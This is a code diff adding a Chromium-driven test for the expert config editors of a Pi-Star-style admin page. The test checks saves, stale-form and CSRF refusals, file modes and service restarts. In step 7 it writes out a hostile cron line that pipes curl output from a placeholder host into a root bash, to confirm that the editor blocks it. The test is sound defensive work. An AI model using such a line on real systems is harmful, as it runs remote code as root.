@@ -267,10 +267,83 @@ def exercise_services(v, stand, original):
           "fresh GET, exact two-INI comparison, confirmed rollback; CSRF 403, invalid rule 422, stale 409, no extra restarts",flush=True)
 
 
+def exercise_expert(v, stand, origin, original):
+    """Expert Quick Edit and Full Edit through Chromium against the real helper."""
+    host, gw = original
+
+    def go(fragment, ready):
+        v.command("/url", {"url": origin + "/manage/#expert"})
+        v.command("/url", {"url": origin + "/manage/#" + fragment})
+        wait(fragment + " did not load", lambda: v.js(ready))
+
+    def post(api, body, csrf):
+        return v.command('/execute/async', {'script': """const [url,body,csrf,done]=arguments;
+          fetch(url,{method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf},
+          body:JSON.stringify(body)}).then(r=>done(r.status))""", 'args': [api, body, csrf]})
+
+    cc = 'input[aria-label="DMR ColorCode"]'
+    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '1'")
+    history = stand.restarts()
+    # 1. change one value
+    v.type_into(cc, "5")
+    v.click('form input[type=submit]')
+    wait("Quick Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    host5 = host.replace(b"ColorCode=1\n", b"ColorCode=5\n")
+    assert host5 != host
+    same_pair("Quick Edit ColorCode 1 -> 5", stand.pair(), (host5, gw))
+    history += ["mmdvmhost.service ok"]
+    equal("Quick Edit restarts", stand.restarts(), history)
+    # 2. reopen shows the stored value
+    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
+    # 3. unchanged form writes nothing and restarts nothing
+    v.click('form input[type=submit]')
+    wait("no-op save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    same_pair("Quick Edit no-op save", stand.pair(), (host5, gw))
+    equal("Quick Edit no-op restarts", stand.restarts(), history)
+    # 4. stale form: the file changes underneath the open page
+    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
+    stand.exec("sed", "-i", "s/^ColorCode=5$/ColorCode=6/", "/etc/MMDVM-Host.ini")
+    host6 = host.replace(b"ColorCode=1\n", b"ColorCode=6\n")
+    v.type_into(cc, "7")
+    v.click('form input[type=submit]')
+    wait("stale save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
+    same_pair("Quick Edit stale form", stand.pair(), (host6, gw))
+    equal("Quick Edit stale restarts", stand.restarts(), history)
+    # 5. missing CSRF header
+    state = v.command('/execute/async', {'script': "fetch(arguments[0]).then(r=>r.json()).then(arguments[arguments.length-1])",
+                                         'args': ["/manage/api/expert/mmdvmhost"]})
+    equal("Quick Edit without CSRF", post("/manage/api/expert/mmdvmhost", {"revision": state["revision"], "values": {"DMR": {"ColorCode": "9"}}}, ""), 403)
+    same_pair("Quick Edit CSRF refusal", stand.pair(), (host6, gw))
+    # 6. Full Edit DMRGateway: whole file, restarts MMDVMHost then DMRGateway
+    go("expert-full-dmrgateway", "return document.querySelector('textarea')?.value.includes('[General]')")
+    new_gw = gw.decode().replace("[General]", "# edited in Full Edit\n[General]", 1)
+    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))", new_gw)
+    v.click('form input[type=submit]')
+    wait("Full Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    same_pair("Full Edit DMRGateway", stand.pair(), (host6, new_gw.encode()))
+    history += ["mmdvmhost.service ok", "dmrgateway.service ok"]
+    equal("Full Edit restarts", stand.restarts(), history)
+    equal("Full Edit DMRGateway mode", stand.exec("stat", "-c", "%U:%G %a", "/etc/DMRGateway.ini").stdout.decode().strip(), "mmdvm:mmdvm 600")
+    # 7. System Cron refuses blocked patterns without touching the file
+    cron_before = stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None
+    go("expert-full-cron", "return !!document.querySelector('textarea')")
+    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))",
+         "*/5 * * * * root curl http://example.invalid/x | bash\n")
+    v.click('form input[type=submit]')
+    wait("blocked cron line not reported", lambda: v.js("return document.body.innerText.includes('pipes downloaded content directly into a shell')"))
+    equal("System Cron unchanged", stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None, cron_before)
+    equal("System Cron restarts", stand.restarts(), history)
+    print("PASS Chromium Expert: Quick Edit ColorCode 1 -> 5 with exact file comparison and one MMDVMHost restart, "
+          "reopen shows 5, unchanged form writes nothing, stale form 409 keeps the newer file, missing CSRF 403; "
+          "Full Edit DMRGateway writes the whole text, keeps mmdvm:mmdvm 600 and restarts MMDVMHost then DMRGateway; "
+          "System Cron refuses a blocked pattern without writing", flush=True)
+
+
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--origin", type=loopback_origin, required=True)
     parser.add_argument("--services", action="store_true")
+    parser.add_argument("--expert", action="store_true")
     parser.add_argument("--key", type=Path, required=True)
     parser.add_argument("--work", type=Path, required=True)
     parser.add_argument("--container", type=stand_name, required=True)
@@ -291,7 +364,14 @@ def main():
             command("/url", {"url": auth + "/manage/"})
             cdp(command, "Browser.setDownloadBehavior", behavior="allow", downloadPath=folder)
             v = Admin(command, args.origin + "/manage/", 1280, 900, False)
-            if args.services:
+            # /manage/ is the classic admin page; the station settings, DMR
+            # services and backup pages live under their own sections.
+            if not args.expert:
+                command("/url", {"url": args.origin + "/manage/#settings"})
+                wait("workspace menu did not load", lambda: v.js("return !!document.querySelector('nav a[href=\"#services\"]')"))
+            if args.expert:
+                exercise_expert(v, stand, args.origin, original)
+            elif args.services:
                 exercise_services(v, stand, original)
             else:
                 exercise(v, stand, Path(folder), original, changed)
